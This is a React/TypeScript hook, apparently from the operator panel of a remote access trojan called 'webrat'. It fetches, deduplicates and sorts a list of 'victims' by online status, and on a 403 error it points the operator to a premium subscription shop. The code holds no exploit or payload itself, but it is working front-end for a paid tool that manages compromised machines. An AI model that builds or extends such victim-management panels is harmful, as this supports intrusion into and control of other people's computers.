"use client";

import { useEffect, useMemo, useRef, useState } from "react";

import { useVictimsQuery } from "./use-victims-query";
import { showToast } from "../toast";
import type { Victim } from "../api/victims";
import { dedupeVictims, stableSortVictims, type StatusSortMode } from "../panel/utils/victims-normalize";

function readSortMode(): StatusSortMode {
  try {
    const raw = String(localStorage.getItem("webrat_status_sort") || "").trim();
    if (raw === "offline_first" || raw === "online_first") return raw;
  } catch {
  }
  return "online_first";
}

export function useVictimsList() {
  const q = useVictimsQuery();

  const [sortMode, setSortMode] = useState<StatusSortMode>("online_first");
  useEffect(() => {
    setSortMode(readSortMode());
  }, []);

  const stableIndexByKey = useRef<Map<string, number>>(new Map());
  const nextIndexRef = useRef(1);

  const lastForbiddenToastAt = useRef(0);
  const lastUnauthorizedAt = useRef(0);

  useEffect(() => {
    const err = q.error as (Error & { status?: number }) | null;
    const status = err?.status;

    if (status === 401) {
      const now = Date.now();
      if (now - lastUnauthorizedAt.current < 3000) return;
      lastUnauthorizedAt.current = now;
      try {
        window.location.replace("/login");
      } catch {
        window.location.href = "/login";
      }
      return;
    }

    if (status === 403) {
      const now = Date.now();
      if (now - lastForbiddenToastAt.current > 8000) {
        lastForbiddenToastAt.current = now;
        showToast("error", "You do not have Premium subscription");
      }
      try {
        if (window.location.hash.toLowerCase() !== "#shop") {
          window.location.hash = "#shop";
        }
      } catch {
      }
    }
  }, [q.error]);

  const victims = useMemo(() => {
    const raw = (Array.isArray(q.data) ? q.data : []) as Victim[];
    const deduped = dedupeVictims(raw);
    return stableSortVictims({
      list: deduped,
      sortMode,
      stableIndexByKey: stableIndexByKey.current,
      nextIndexRef,
    });
  }, [q.data, sortMode]);

  return {
    ...q,
    victims,
  };
}
